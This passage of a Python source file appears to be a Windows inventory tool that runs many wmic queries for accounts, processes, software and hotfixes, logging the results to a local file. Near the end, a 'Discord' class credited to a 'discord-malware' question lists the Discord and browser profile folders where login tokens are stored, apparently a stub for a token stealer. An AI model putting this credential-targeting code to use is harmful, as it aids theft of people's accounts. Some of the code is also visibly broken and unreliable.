            "CurrentMimeType",
            "CurrentNaturalLanguage",
            "CurrentPaperType",
            "Default",
            "DefaultCapabilities",
            "DefaultCopies",
            "DefaultLanguage",
            "DefaultMimeType",
            "DefaultNumberUp",
            "DefaultPaperType",
            "DefaultPriority",
            "Description",
            "DetectedErrorState",
            "DeviceID",
            "Direct",
            "DoCompleteFirst",
            "DriverName",
            "EnableBIDI",
            "EnableDevQueryPrint",
            "ErrorCleared",
            "ErrorDescription",
            "ErrorInformation",
            "ExtendedDetectedErrorState",
            "ExtendedPrinterStatus",
            "Hidden",
            "HorizontalResolution",
            "InstallDate",
            "JobCountSinceLastReset",
            "KeepPrintedJobs",
            "LanguagesSupported",
            "LastErrorCode",
            "Local",
            "Location",
            "MarkingTechnology",
            "MaxCopies",
            "MaxNumberUp",
            "MaxSizeSupported",
            "MimeTypesSupported",
            "Name",
            "NaturalLanguagesSupported",
            "Network",
            "PaperSizesSupported",
            "PaperTypesAvailable",
            "Parameters",
            "PNPDeviceID",
            "PortName",
            "PowerManagementCapabilities",
            "PowerManagementSupported",
            "PrinterPaperNames",
            "PrinterState",
            "PrinterStatus",
            "PrintJobDataType",
            "PrintProcessor",
            "Priority",
            "Published",
            "Queued",
            "RawOnly",
            "SeparatorFile",
            "ServerName",
            "Shared",
            "ShareName",
            "SpoolEnabled",
            "StartTime",
            "Status",
            "StatusInfo",
            "SystemCreationClassName",
            "SystemName",
            "TimeOfLastReset",
            "UntilTime",
            "VerticalResolution",
            "WorkOffline"
        ]
        self.wmic_PRINTERCONFIG=[
            "BitsPerPel",
            "Caption",
            "Collate",
            "Color",
            "Copies",
            "Description",
            "DeviceName",
            "DisplayFlags",
            "DisplayFrequency",
            "DitherType",
            "DriverVersion",
            "Duplex",
            "FormName",
            "HorizontalResolution",
            "ICMIntent",
            "ICMMethod",
            "LogPixels",
            "MediaType",
            "Name",
            "Orientation",
            "PaperLength",
            "PaperSize",
            "PaperWidth",
            "PelsHeight",
            "PelsWidth",
            "PrintQuality",
            "Scale",
            "SettingID",
            "SpecificationVersion",
            "TTOption",
            "VerticalResolution",
            "XResolution",
            "YResolution"
        ]
        self.wmic_PRINTJOB=[
            "Caption",
            "Color",
            "DataType",
            "Description",
            "Document",
            "DriverName",
            "ElapsedTime",
            "HostPrintQueue",
            "InstallDate",
            "JobId",
            "JobStatus",
            "Name",
            "Notify",
            "Owner",
            "PagesPrinted",
            "PaperLength",
            "PaperSize",
            "PaperWidth",
            "Parameters",
            "PrintProcessor",
            "Priority",
            "Size",
            "SizeHigh",
            "StartTime",
            "Status",
            "StatusMask",
            "TimeSubmitted",
            "TotalPages",
            "UntilTime"
        ]
        self.wmic_PROCESS=[
            "Caption",
            "CommandLine",
            "CreationClassName",
            "CreationDate",
            "CSCreationClassName",
            "CSName",
            "Description",
            "ExecutablePath",
            "ExecutionState",
            "Handle",
            "HandleCount",
            "InstallDate",
            "KernelModeTime",
            "MaximumWorkingSetSize",
            "MinimumWorkingSetSize",
            "Name",
            "OSCreationClassName",
            "OSName",
            "OtherOperationCount",
            "OtherTransferCount",
            "PageFaults",
            "PageFileUsage",
            "ParentProcessId",
            "PeakPageFileUsage",
            "PeakVirtualSize",
            "PeakWorkingSetSize",
            "Priority",
            "PrivatePageCount",
            "ProcessId",
            "QuotaNonPagedPoolUsage",
            "QuotaPagedPoolUsage",
            "QuotaPeakNonPagedPoolUsage",
            "QuotaPeakPagedPoolUsage",
            "ReadOperationCount",
            "ReadTransferCount",
            "SessionId",
            "Status",
            "TerminationDate",
            "ThreadCount",
            "UserModeTime",
            "VirtualSize",
            "WindowsVersion",
            "WorkingSetSize",
            "WriteOperationCount",
            "WriteTransferCount",
            "System",
            "Idle",
            "Process"
        ]
        self.wmic_PRODUCT=[
            "AssignmentType",
            "Caption",
            "Description",
            "HelpLink",
            "HelpTelephone",
            "IdentifyingNumber",
            "InstallDate",
            "InstallDate2",
            "InstallLocation",
            "InstallSource",
            "InstallState",
            "Language",
            "LocalPackage",
            "Name",
            "PackageCache",
            "PackageCode",
            "PackageName",
            "ProductID",
            "RegCompany",
            "RegOwner",
            "SKUNumber",
            "Transforms",
            "URLInfoAbout",
            "URLUpdateInfo",
            "Vendor",
            "Version",
            "WordCount"
        ]
        self.wmic_QFE=[
            "Caption",
            "CSName",
            "Description",
            "FixComments",
            "HotFixID",
            "InstallDate",
            "InstalledBy",
            "InstalledOn",
            "Name",
            "ServicePackInEffect",
            "Status"
        ]
        self.wmic_QUOTASETTING=[""]
        self.wmic_RDACCOUNT=[
            "AccountName",
            "AuditFail",
            "AuditSuccess",
            "Caption",
            "Description",
            "InstallDate",
            "Name",
            "PermissionsAllowed",
            "PermissionsDenied",
            "SID",
            "Status",
            "TerminalName"
        ]
        self.wmic_RDNIC=[
            "Caption",
            "Description",
            "DeviceIDList",
            "InstallDate",
            "MaximumConnections",
            "Name",
            "NetworkAdapterID",
            "NetworkAdapterLanaID",
            "NetworkAdapterList",
            "NetworkAdapterName",
            "PolicySourceMaximumConnections",
            "Status",
            "TerminalName"
        ]
        self.wmic_RDPERMISSIONS=[
            "Caption",
            "DenyAdminPermissionForCustomization",
            "Description",
            "InstallDate",
            "Name",
            "PolicySourceDenyAdminPermissionForCustomization",
            "Status",
            "StringSecurityDescriptor",
            "TerminalName"
        ]
        self.wmic_RDTOGGLE=[
            "ActiveDesktop",
            "AllowTSConnections",
            "Caption",
            "DeleteTempFolders",
            "Description",
            "DirectConnectLicenseServers",
            "DisableForcibleLogoff",
            "EnableAutomaticReconnection",
            "EnableDFSS",
            "EnableDiskFSS",
            "EnableNetworkFSS",
            "EnableRemoteDesktopMSI",
            "FallbackPrintDriverType",
            "GetCapabilitiesID",
            "HomeDirectory",
            "InstallDate",
            "LicensingDescription",
            "LicensingName",
            "LicensingType",
            "LimitedUserSessions",
            "Logons",
            "Name",
            "Net",
            "workFSSCatchAllWeight",
            "NetworkFSSLocalSystemWeight",
            "NetworkFSSUserSessionWeight",
            "PolicySourceAllowTSConnections",
            "PolicySourceConfiguredLicenseServers",
            "PolicySourceDeleteTempFolders",
            "PolicySource",
            "DirectConnectLicenseServers",
            "PolicySourceEnableAutomaticReconnection",
            "PolicySourceEnableDFSS",
            "PolicySourceEnableRemoteDesktopMSI",
            "PolicySourceFallbackPrintDriverType",
            "PolicySourceHomeDirectory",
            "PolicySourceLicensingType",
            "PolicySourceProfilePath",
            "PolicySourceRedirectSmartCards",
            "PolicySourceSingleSession",
            "PolicySourceTimeZoneRedirection",
            "PolicySourceUseRDEasyPrintDriver",
            "PolicySourceUseTempFolders",
            "PossibleLicensingTypes",
            "ProfilePath",
            "RedirectSmartCards",
            "ServerName",
            "SessionBrokerDrainMode",
            "SingleSession",
            "Status",
            "TerminalServerMode",
            "TimeZoneRedirection",
            "UseRDEasyPrintDriver",
            "UserPermission"
        ]
        self.wmic_RECOVEROS=[
            "AutoReboot",
            "Caption",
            "DebugFilePath",
            "DebugInfoType",
            "Description",
            "ExpandedDebugFilePath",
            "ExpandedMiniDumpDirectory",
            "KernelDumpOnly",
            "MiniDumpDirectory",
            "Name",
            "OverwriteExistingDebugFile",
            "SendAdminAlert",
            "SettingID",
            "WriteDebugInfo"
        ]
        self.wmic_REGISTRY=[
            "Caption",
            "CurrentSize",
            "Description",
            "InstallDate",
            "MaximumSize",
            "Name",
            "ProposedSize"
        ]
        self.wmic_SCSICONTROLLER=[
            "Availability",
            "Caption",
            "ConfigManagerErrorCode",
            "ConfigManagerUserConfig",
            "ControllerTimeouts",
            "CreationClassName",
            "Description",
            "DeviceID",
            "DeviceMap",
            "DriverName",
            "ErrorCleared",
            "ErrorDescription",
            "HardwareVersion",
            "Index",
            "InstallDate",
            "LastErrorCode",
            "Manufacturer",
            "MaxDataWidth",
            "MaxNumberControlled",
            "MaxTransferRate",
            "Name",
            "PNPDeviceID",
            "PowerManagementCapabilities",
            "PowerManagementSupported",
            "ProtectionManagement",
            "ProtocolSupported",
            "Status",
            "StatusInfo",
            "SystemCreationClassName",
            "SystemName"
        ]
        self.wmic_SERVER=[""]
        self.wmic_SERVICE=[
            "AcceptPause",
            "AcceptStop",
            "Caption",
            "CheckPoint",
            "CreationClassName",
            "DelayedAutoStart",
            "Description",
            "DesktopInteract",
            "DisplayName",
            "ErrorControl",
            "ExitCode",
            "InstallDate",
            "Name",
            "PathName",
            "ProcessId",
            "ServiceSpecificExitCode",
            "ServiceType",
            "Started",
            "StartMode",
            "StartName",
            "State",
            "Status",
            "SystemCreationClassName",
            "SystemName",
            "TagId"
        ]
        # self.wmic_SHADOWCOPY=[]
        # self.wmic_SHADOWSTORAGE=[]
        self.wmic_SHARE=[
            "AccessMask",
            "AllowMaximum",
            "Caption",
            "Description",
            "InstallDate",
            "MaximumAllowed",
            "Name",
            "Path",
            "Status"
        ]
        # self.wmic_SOFTWAREELEMENT=[]
        # self.wmic_SOFTWAREFEATURE=[]
        self.wmic_SOUNDDEV=[
            "Availability",
            "Caption",
            "ConfigManagerErrorCode",
            "ConfigManagerUserConfig",
            "CreationClassName",
            "Description",
            "DeviceID",
            "DMABufferSize",
            "ErrorCleared",
            "ErrorDescription",
            "InstallDate",
            "LastErrorCode",
            "Manufacturer",
            "MPU401Address",
            "Name",
            "PNPDeviceID",
            "PowerManagementCapabilities",
            "PowerManagementSupported",
            "ProductName",
            "Status",
            "StatusInfo",
            "SystemCreationClassName"
        ]
        self.wmic_STARTUP=[
            "Caption",
            "Command",
            "Description",
            "Location",
            "Name",
            "SettingID",
            "User"
        ]
        self.wmic_SYSACCOUNT=[
            "Caption",
            "Description",
            "Domain",
            "InstallDate",
            "LocalAccount",
            "Name",
            "SID",
            "SIDType"
        ]#To display as table
        self.wmic_SYSDRIVER=[
            "AcceptPause",
            "AcceptStop",
            "Caption",
            "CreationClassName",
            "Description",
            "DesktopInteract",
            "DisplayName",
            "ErrorControl",
            "ExitCode",
            "InstallDate",
            "Name",
            "PathName",
            "ServiceSpecificExitCode",
            "ServiceType",
            "StartedStartMode",
            "StartName",
            "State",
            "Status",
            "SystemCreationClassName",
            "SystemName"
        ]
        self.wmic_SYSTEMENCLOSURE=[
            "AudibleAlarm",
            "BreachDescription",
            "CableManagementStrategy",
            "Caption",
            "ChassisTypes",
            "CreationClassName",
            "CurrentRequiredOrProduced",
            "Depth",
            "Description",
            "HeatGeneration",
            "Height",
            "HotSwappable",
            "InstallDate",
            "LockPresent",
            "Manufacturer",
            "Model",
            "Name",
            "NumberOfPowerCords",
            "OtherIdentifyingInfo",
            "PartNumber",
            "PoweredOn",
            "Removable",
            "Replaceable",
            "SecurityBreach",
            "SecurityStatus",
            "SerialNumber",
            "ServiceDescriptions",
            "ServicePhilosophy",
            "SKU",
            "SMBIOSAssetTag",
            "Status",
            "Tag",
            "TypeDescriptions",
            "Version",
            "VisibleAlarm",
            "Weight"
        ]
        self.wmic_SYSTEMSLOT=[
            "BusNumber",
            "Caption",
            "ConnectorPinout",
            "ConnectorType",
            "CreationClassName",
            "CurrentUsage",
            "Description",
            "DeviceNumber",
            "FunctionNumber",
            "HeightAllowed",
            "InstallDate",
            "LengthAllowed",
            "Manufacturer",
            "MaxDataWidth",
            "Model",
            "Name",
            "Number",
            "OtherIdentifyingInfo",
            "PartNumber",
            "PMESignal",
            "PoweredOn",
            "PurposeDescription",
            "SegmentGroupNumber",
            "SerialNumber",
            "Shared",
            "SKU",
            "SlotDesignation",
            "SpecialPurpose",
            "Status",
            "SupportsHotPlug",
            "Tag",
            "ThermalRating",
            "VccMixedVoltageSupport",
            "Version"
        ]
        # self.wmic_TAPEDRIVE=[]
        # self.wmic_TEMPERATURE=[]
        self.wmic_TIMEZONE=[
            "Bias",
            "Caption",
            "DaylightBias",
            "DaylightDay",
            "DaylightDayOfWeek",
            "DaylightHour",
            "DaylightMillisecond",
            "DaylightMinute",
            "DaylightMonth",
            "DaylightName",
            "DaylightSecond",
            "DaylightYear",
            "Description",
            "SettingID",
            "StandardBias",
            "StandardDay",
            "StandardDayOfWeek",
            "StandardHour",
            "StandardMillisecond",
            "StandardMinute",
            "StandardMonth",
            "StandardName",
            "StandardSecond"
        ]
        # self.wmic_UPS=[]
        self.wmic_USERACCOUNT=[
            "AccountType",
            "Caption",
            "Description",
            "Disabled",
            "Domain",
            "FullName",
            "InstallDate",
            "LocalAccount",
            "Lockout",
            "Name",
            "PasswordChangeable",
            "PasswordExpires",
            "PasswordRequired",
            "SID",
            "SIDType"
        ]
        # self.wmic_VOLTAGE=[]
        self.wmic_VOLUME=[
            "Access",
            "Automount",
            "Availability",
            "BlockSize",
            "BootVolume",
            "Capacity",
            "Caption",
            "Compressed",
            "ConfigManagerErrorCode",
            "ConfigManagerUserConfig",
            "CreationClassName",
            "Description",
            "DeviceID",
            "DirtyBitSet",
            "DriveLetter",
            "DriveType",
            "ErrorCleared",
            "ErrorDescription",
            "ErrorMethodology",
            "FileSystem",
            "FreeSpace",
            "IndexingEnabled",
            "InstallDate",
            "Label",
            "LastErrorCode",
            "MaximumFileNameLength",
            "Name",
            "NumberOfBlocks",
            "PageFilePresent",
            "PNPDeviceID",
            "PowerManagementCapabilities",
            "PowerManagementSupported",
            "Purpose",
            "QuotasEnabled",
            "QuotasIncomplete",
            "QuotasRebuilding",
            "SerialNumber",
            "Status",
            "StatusInfo",
            "SupportsDiskQuotas",
            "SupportsFileBasedCompression",
            "SystemCreationClassName",
            "SystemName"
        ]
        # self.wmic_VOLUMEQUOTASETTING=[]
        self.wmic_VOLUMEUSERQUOTA=[
            "Account",
            "DiskSpaceUsed",
            "Limit",
            "Status",
            "Volume"
        ] #only works if prog launched as admin
        self.wmic_WMISET=[
            "ASPScriptDefaultNamespace",
            "ASPScriptEnabled",
            "AutorecoverMofs",
            "AutoStartWin9X",
            "BackupInterval",
            "BackupLastTime",
            "BuildVersion",
            "Caption",
            "DatabaseDirectory",
            "DatabaseMaxSize",
            "Description",
            "EnableAnonWin9xConnections",
            "EnableEvents",
            "EnableStartupHeapPreallocation",
            "HighThresholdOnClientObjects",
            "HighThresholdOnEvents",
            "InstallationDirectory",
            "LastStartupHeapPreallocation",
            "LoggingDirectory",
            "LoggingLevel",
            "LowThresholdOnClientObjects",
            "LowThresholdOnEvents",
            "MaxLogFileSize",
            "MaxWaitOnClientObjects",
            "MaxWaitOnEvents",
            "MofSelfInstallDirectory",
            "SettingID"
        ]
class get(root):
    def time_update():
        RI.date=datetime.now()
    def Write_to(file,content,add):
        #print(f"{os.getcwd()}\n\n\n\n{file}\n\n\n\n{type(add)}={add}\n\n\n\n{content}\n\n\n\n")
        if os.path.exists(file)!=True:
            f=open(file,"w")
            f.write("")
            f.close()
        if add==1:
            level="w"
        elif add==2:
            level="a"
        elif add==3:
            level="r"
        print(f"\nlevel={level}\ntype(level)={type(level)}\n")#\n\n\n\n\n\n\n\n\n
        f=open(file,level)
        if level=="w":
            f.write("")
        elif level=="a":
            f.write(content)
        else:
            c=f.read()
        if level=="r":
            return c
    def environnement(list):
        data={}
        for i in range(len(list)):
            try:
                a=os.getenv(list[i])
                data[list[i]]=str(a)
            except:
                data[list[i]]="nothing found"
        return data
    def S_v_r(self):
        """System_vars_result"""
        self.System_vars_result=get.environnement(self.System_vars)
    def U_v_r(self):
        """User_vars_result"""
        self.User_vars_result=get.environnement(self.User_vars)
    def S_i_r(self):
        """System Info Result"""
        self.system_info_result=get.environnement(self.system_info)
    # def info(self):
        # """system_vars"""
        # self.System_vars_result={}
        # self.User_vars_result={}
        # self.system_info_result={}
        # for i in range(len(self.System_vars)):
        #     self.System_vars_result[self.System_vars[i]]=str(os.getenv(self.System_vars[i]))
        # for i in range(len(self.User_vars)):
        #     self.User_vars_result[self.User_vars[i]]=str(os.getenv(self.User_vars[i]))
        # for i in range(len(self.system_info)):
        #     self.system_info_result[self.system_info[i]]=str(os.getenv(self.system_info[i]))
        # pass
    class wmic(root):
        def main1(wmic,sub):
            default,z={},"\"\""
            for i in range(len(wmic)):
                print("wmic {} get {}".format(sub,wmic[i]))
                p = Popen("wmic {} get {}".format(sub,wmic[i]), shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
                try:
                    # print("in Try")
                    c=(p.stdout.read() + p.stderr.read()).decode().split("\n")#[1]
                    print(f"wmic[{i}]={c}")
                    print(f"len(c)={len(c)}")
                    if len(c)>1:
                        print("in pop")
                        z=c.pop(0)
                        print(f"z={z}")
                    default[wmic[i]]=c#.pop(0)
                except:
                    print("except")
                    c=get.wmic.processString(p)
                    print(f"wmic[{i}]={c}")
                    print(f"len(c)={len(c)}")
                    if len(c)>1:
                        print("in pop")
                        z=c.pop(0)
                        print(f"z={z}")
                    default[wmic[i]]=c
                get.Write_to("wmic_info.txt",f"from main1:{wmic[i]}={default[wmic[i]]}\tc={c}\tz(c.pop(0))={z}\n",2)
                RI.wmic_global_counter+=1
            RI.wmic_main_class_counter+=1
                #default[wmic[i]]=(p.stdout.read() + p.stderr.read()).decode().split("\n")#[1]
            
            return default
        def main2(wmic,sub):
            default,z={},"\"\""
            for i in range(len(wmic)):
                print("wmic {} {}".format(sub,wmic[i]))
                p = Popen("wmic {} {}".format(sub,wmic[i]), shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) 
                try:
                    # print("in Try")
                    # c=(p.stdout.read() + p.stderr.read()).decode().split("\n")#[1]
                    # default[wmic[i]]=c.pop(0)
                    c=(p.stdout.read() + p.stderr.read()).decode().split("\n")#[1]
                    print(f"wmic[{i}]={c}")
                    print(f"len(c)={len(c)}")
                    if len(c)>1:
                        print("in pop")
                        z=c.pop(0)
                        print(f"z={z}")
                    default[wmic[i]]=c
                except:
                    print("except")
                    c=get.wmic.processString(p)
                    print(f"wmic[{i}]={c}")
                    print(f"len(c)={len(c)}")
                    if len(c)>1:
                        print("in pop")
                        z=c.pop(0)
                        print(f"z={z}")
                    default[wmic[i]]=c
                RI.wmic_global_counter+=1
            RI.wmic_main_class_counter+=1
            get.Write_to("wmic_info.txt",f"from main2:{wmic[i]}={default[wmic[i]]}\tc={c}\tz(c.pop(0))={z}\n",2)
            return default
        def processString(result):
            p=str(result)
            word=""
            A=0
            for i in p:
                if i=="\n":# and A==0:
                    A=1
                elif i==" ":
                    A=2
                elif A==1:
                    word+=i
            return word
        def main3(wmic,sub):
            p = Popen("wmic {} {}".format(sub,wmic[i]), shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
            p=get.wmic.processString(p)
            get.Write_to("wmic_info.txt",f"from main3:p={p}\n",2)
            return p
        def csproduct(self):
            self.csproduct_result=get.wmic.main1(self.wmic_csproduct,"csproduct")
        def ALIAS(self):
            self.ALIAS_result=get.wmic.main2(self.wmic_ALIAS,"ALIAS")
        def BASEBOARD(self):
            self.BASEBOARD_result=get.wmic.main1(self.wmic_BASEBOARD,"BASEBOARD")
        def BIOS(self):
            self.BIOS_result=get.wmic.main1(self.wmic_BIOS,"BIOS")
        def BOOTCONFIG(self):
            self.BOOTCONFIG_result=get.wmic.main1(self.wmic_BOOTCONFIG,"BOOTCONFIG")
        # def CDROM(self):
        #     self.CDROM_result=get.wmic.main1(self.wmic_CDROM,"CDROM")
        def COMPUTERSYSTEM(self):
            self.COMPUTERSYSTEM_result=get.wmic.main1(self.wmic_COMPUTERSYSTEM,"COMPUTERSYSTEM")
        def CPU(self):
            self.CPU_result=get.wmic.main1(self.wmic_CPU,"CPU")
        # def DATAFILE(self):
        #     self.DATAFILE_result=get.wmic.main1(self.wmic_DATAFILE,"DATAFILE")
        def DCOMAPP(self):
            self.DCOMAPP_result=get.wmic.main1(self.wmic_DCOMAPP,"DCOMAPP")
        def DESKTOP(self):
            self.DESKTOP_result=get.wmic.main1(self.wmic_DESKTOP,"DESKTOP")
        def DESKTOPMONITOR(self):
            self.DESKTOPMONITOR_result=get.wmic.main1(self.wmic_DESKTOPMONITOR,"DESKTOPMONITOR")
        def DEVICEMEMORYADDRESS(self):
            self.DEVICEMEMORYADDRESS_result=get.wmic.main1(self.wmic_DEVICEMEMORYADDRESS,"DEVICEMEMORYADDRESS")
        def DISKDRIVE(self):
            self.DISKDRIVE_result=get.wmic.main1(self.wmic_DISKDRIVE,"DISKDRIVE")
        # def DISKQUOTA(self):
        #     self.DISKQUOTA_result=get.wmic.main1(self.wmic_DISKQUOTA,"DISKQUOTA")
        def DMACHANNEL(self):
            self.DMACHANNEL_result=get.wmic.main1(self.wmic_DMACHANNEL,"DMACHANNEL")
        def ENVIRONMENT(self):
            self.ENVIRONMENT_result=get.wmic.main1(self.wmic_ENVIRONMENT,"ENVIRONMENT")
        # def FSDIR(self):
        #     self.FSDIR_result=get.wmic.main1(self.wmic_FSDIR,"FSDIR")
        def GROUP(self):
            self.GROUP_result=get.wmic.main1(self.wmic_GROUP,"GROUP")
        def IDECONTROLLER(self):
            self.IDECONTROLLER_result=get.wmic.main1(self.wmic_IDECONTROLLER,"IDECONTROLLER")
        def IRQ(self):
            self.IRQ_result=get.wmic.main1(self.wmic_IRQ,"IRQ")
        # def JOB(self):
        #     self.JOB_result=get.wmic.main1(self.wmic_JOB,"JOB")
        def LOADORDER(self):
            self.LOADORDER_result=get.wmic.main1(self.wmic_LOADORDER,"LOADORDER")
        def LOGICALDISK(self):
            self.LOGICALDISK_result=get.wmic.main1(self.wmic_LOGICALDISK,"LOGICALDISK")
        def LOGON(self):
            self.LOGON_result=get.wmic.main1(self.wmic_LOGON,"LOGON")
        def MEMCACHE(self):
            self.MEMCACHE_result=get.wmic.main1(self.wmic_MEMCACHE,"MEMCACHE")
        def MEMORYCHIP(self):
            self.MEMORYCHIP_result=get.wmic.main1(self.wmic_MEMORYCHIP,"MEMORYCHIP")
        def MEMPHYSICAL(self):
            self.MEMPHYSICAL_result=get.wmic.main1(self.wmic_MEMPHYSICAL,"MEMPHYSICAL")
        def NETCLIENT(self):
            self.NETCLIENT_result=get.wmic.main1(self.wmic_NETCLIENT,"NETCLIENT")
        def NETLOGIN(self):
            self.NETLOGIN_result=get.wmic.main1(self.wmic_NETLOGIN,"NETLOGIN")
        def NETPROTOCOL(self):
            self.NETPROTOCOL_result=get.wmic.main1(self.wmic_NETPROTOCOL,"NETPROTOCOL")
        # def NETUSE(self):
        #     self.NETUSE_result=get.wmic.main1(self.wmic_NETUSE,"NETUSE")
        def NIC(self):
            self.NIC_result=get.wmic.main1(self.wmic_NIC,"NIC")
        def NICCONFIG(self):
            self.NICCONFIG_result=get.wmic.main1(self.wmic_NICCONFIG,"NICCONFIG")
        def NTDOMAIN(self):
            self.NTDOMAIN_result=get.wmic.main1(self.wmic_NTDOMAIN,"NTDOMAIN")
        # def NTEVENT(self):
        #     self.NTEVENT_result=get.wmic.main1(self.wmic_NTEVENT,"NTEVENT")
        def NTEVENTLOG(self):
            self.NTEVENTLOG_result=get.wmic.main1(self.wmic_NTEVENTLOG,"NTEVENTLOG")
        # def ONBOARDDEVICE(self):
        #     self.ONBOARDDEVICE_result=get.wmic.main1(self.wmic_ONBOARDDEVICE,"ONBOARDDEVICE")
        def OS(self):
            self.OS_result=get.wmic.main1(self.wmic_OS,"OS")
        def PAGEFILE(self):
            self.PAGEFILE_result=get.wmic.main1(self.wmic_PAGEFILE,"PAGEFILE")
        # def PAGEFILESET(self):
        #     self.PAGEFILESET_result=get.wmic.main1(self.wmic_PAGEFILESET,"PAGEFILESET")
        def PARTITION(self):
            self.PARTITION_result=get.wmic.main1(self.wmic_PARTITION,"PARTITION")
        def PORT(self):
            self.PORT_result=get.wmic.main1(self.wmic_PORT,"PORT")
        def PORTCONNECTOR(self):
            self.PORTCONNECTOR_result=get.wmic.main1(self.wmic_PORTCONNECTOR,"PORTCONNECTOR")
        def PRINTER(self):
            self.PRINTER_result=get.wmic.main1(self.wmic_PRINTER,"PRINTER")
        def PRINTERCONFIG(self):
            self.PRINTERCONFIG_result=get.wmic.main1(self.wmic_PRINTERCONFIG,"PRINTERCONFIG")
        def PRINTJOB(self):
            self.PRINTJOB_result=get.wmic.main1(self.wmic_PRINTJOB,"PRINTJOB")
        def PROCESS(self):
            self.PROCESS_result=get.wmic.main1(self.wmic_PROCESS,"PROCESS")
        def PRODUCT(self):
            self.PRODUCT_result=get.wmic.main1(self.wmic_PRODUCT,"PRODUCT")
        def QFE(self):
            self.QFE_result=get.wmic.main1(self.wmic_QFE,"QFE")
        def QUOTASETTING(self):
            self.QUOTASETTING_result=get.wmic.main1(self.wmic_QUOTASETTING,"QUOTASETTING")
        def RDACCOUNT(self):
            self.RDACCOUNT_result=get.wmic.main1(self.wmic_RDACCOUNT,"RDACCOUNT")
        def RDNIC(self):
            self.RDNIC_result=get.wmic.main1(self.wmic_RDNIC,"RDNIC")
        def RDPERMISSIONS(self):
            self.RDPERMISSIONS_result=get.wmic.main1(self.wmic_RDPERMISSIONS,"RDPERMISSIONS")
        def RDTOGGLE(self):
            self.RDTOGGLE_result=get.wmic.main1(self.wmic_RDTOGGLE,"RDTOGGLE")
        def RECOVEROS(self):
            self.RECOVEROS_result=get.wmic.main1(self.wmic_RECOVEROS,"RECOVEROS")
        def REGISTRY(self):
            self.REGISTRY_result=get.wmic.main1(self.wmic_REGISTRY,"REGISTRY")
        def SCSICONTROLLER(self):
            self.SCSICONTROLLER_result=get.wmic.main1(self.wmic_SCSICONTROLLER,"SCSICONTROLLER")
        def SERVER(self):
            self.SERVER_result=get.wmic.main1(self.wmic_SERVER,"SERVER")
        def SERVICE(self):
            self.SERVICE_result=get.wmic.main1(self.wmic_SERVICE,"SERVICE")
        # def SHADOWCOPY(self):
        #     self.SHADOWCOPY_result=get.wmic.main1(self.wmic_SHADOWCOPY,"SHADOWCOPY")
        # def SHADOWSTORAGE(self):
        #     self.SHADOWSTORAGE_result=get.wmic.main1(self.wmic_SHADOWSTORAGE,"SHADOWSTORAGE")
        def SHARE(self):
            self.SHARE_result=get.wmic.main1(self.wmic_SHARE,"SHARE")
        # def SOFTWAREELEMENT(self):
        #     self.SOFTWAREELEMENT_result=get.wmic.main1(self.wmic_SOFTWAREELEMENT,"SOFTWAREELEMENT")
        # def SOFTWAREFEATURE(self):
        #     self.SOFTWAREFEATURE_result=get.wmic.main1(self.wmic_SOFTWAREFEATURE,"SOFTWAREFEATURE")
        def SOUNDDEV(self):
            self.SOUNDDEV_result=get.wmic.main1(self.wmic_SOUNDDEV,"SOUNDDEV")
        def STARTUP(self):
            self.STARTUP_result=get.wmic.main1(self.wmic_STARTUP,"STARTUP")
        def SYSACCOUNT(self):
            self.SYSACCOUNT_result=get.wmic.main1(self.wmic_SYSACCOUNT,"SYSACCOUNT")
        def SYSDRIVER(self):
            self.SYSDRIVER_result=get.wmic.main1(self.wmic_SYSDRIVER,"SYSDRIVER")
        def SYSTEMENCLOSURE(self):
            self.SYSTEMENCLOSURE_result=get.wmic.main1(self.wmic_SYSTEMENCLOSURE,"SYSTEMENCLOSURE")
        def SYSTEMSLOT(self):
            self.SYSTEMSLOT_result=get.wmic.main1(self.wmic_SYSTEMSLOT,"SYSTEMSLOT")
        # def TAPEDRIVE(self):
        #     self.TAPEDRIVE_result=get.wmic.main1(self.wmic_TAPEDRIVE,"TAPEDRIVE")
        # def TEMPERATURE(self):
        #     self.TEMPERATURE_result=get.wmic.main1(self.wmic_TEMPERATURE,"TEMPERATURE")
        def TIMEZONE(self):
            self.TIMEZONE_result=get.wmic.main1(self.wmic_TIMEZONE,"TIMEZONE")
        # def UPS(self):
        #     self.UPS_result=get.wmic.main1(self.wmic_UPS,"UPS")
        def USERACCOUNT(self):
            self.USERACCOUNT_result=get.wmic.main1(self.wmic_USERACCOUNT,"USERACCOUNT")
        # def VOLTAGE(self):
        #     self.VOLTAGE_result=get.wmic.main1(self.wmic_VOLTAGE,"VOLTAGE")
        def VOLUME(self):
            self.VOLUME_result=get.wmic.main1(self.wmic_VOLUME,"VOLUME")
        # def VOLUMEQUOTASETTING(self):
        #     self.VOLUMEQUOTASETTING_result=get.wmic.main1(self.wmic_VOLUMEQUOTASETTING,"VOLUMEQUOTASETTING")
        def VOLUMEUSERQUOTA(self):
            self.VOLUMEUSERQUOTA_result=get.wmic.main1(self.wmic_VOLUMEUSERQUOTA,"VOLUMEUSERQUOTA")
        def WMISET(self):
            self.WMISET_result=get.wmic.main1(self.wmic_WMISET,"WMISET")

class Change(root):
    def Directory(key):
        path=os.getenv(key)
        return path
class Discord(root):
    """taken from: https://stackoverflow.com/questions/66192207/discord-malware"""
    def To_come():print("To come")
    def __init__(self):
        self.LOCAL = self.System_vars_result["LOCAL"]
        self.ROAMING = self.System_vars_result["ROAMING"]
        self.PATHS = {
            "Discord"           : self.ROAMING + "\\Discord",
            "Discord Canary"    : self.ROAMING + "\\discordcanary",
            "Discord PTB"       : self.ROAMING + "\\discordptb",
            "Google Chrome"     : self.LOCAL + "\\Google\\Chrome\\User Data\\Default",
            "Opera"             : self.ROAMING + "\\Opera Software\\Opera Stable",
            "Brave"             : self.LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex"            : self.LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
            }
class DisplayTkinter(root):
    def put_in_bold(line,string,var_for_insert,pfonty,pfonts,pfontb,pfontw,style_index):
        default=[]
        this=colum=bold_index=ab_index=0
        bold_word=the_end=the_beg=""
        for b in string:default.append(b)
        b=0
        while b<len(default):
            if this==2:
                the_end+=default[b]
            elif default[b]=="_" and default[b+1]=="_" and this==1:
                ab_index=b+4
                this=2
                b+=1
            elif this==1:
                bold_word+=default[b]
            elif default[b]=="_" and default[b+1]=="_" and this==0:
                bold_index=b+3
                this=1
                b+=1
            else:
                the_beg+=default[b] 
            b+=1
        var_for_insert.insert(float(f"{line}.{colum}"),f"{the_beg}")
